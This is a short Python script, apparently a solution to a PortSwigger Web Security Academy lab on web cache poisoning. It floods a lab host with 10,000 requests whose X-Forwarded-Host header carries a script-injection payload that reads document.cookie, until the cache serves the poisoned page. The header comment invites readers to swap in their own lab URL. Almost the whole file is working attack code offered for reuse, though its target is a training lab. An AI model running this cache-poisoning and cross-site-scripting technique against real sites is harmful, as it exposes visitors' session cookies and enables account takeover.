''''
script written by elfate7 -> Abdallah Atef
instead os using burp intruder which is so slow
i wrote this script and the cache server cached the request 
after 100 requests and the alert with cookie appeared

in your case you can just replace the URL and Host with your own
from port swigger and it will work In Shaa Allah

'''

import requests

url = 'https://0ad00042031579028174b62600d60086.web-security-academy.net/'
headers = {
    'Host': '0ad00042031579028174b62600d60086.web-security-academy.net',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 firefox/127.0',
    'X-Forwarded-Host': 'elfate7.com"></script><script>alert(document.cookie);//',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Cookie': 'session=§7rFdMU5C7V5RrAbwUcmSPvED91af1VEM§',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'https://portswigger.net/',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=1',
    'Te': 'trailers'
}

for i in range(10000):
    response = requests.get(url, headers=headers)
    print(f"Request {i+1}: Status Code {response.status_code}")

print("Completed sending 10,000 requests")
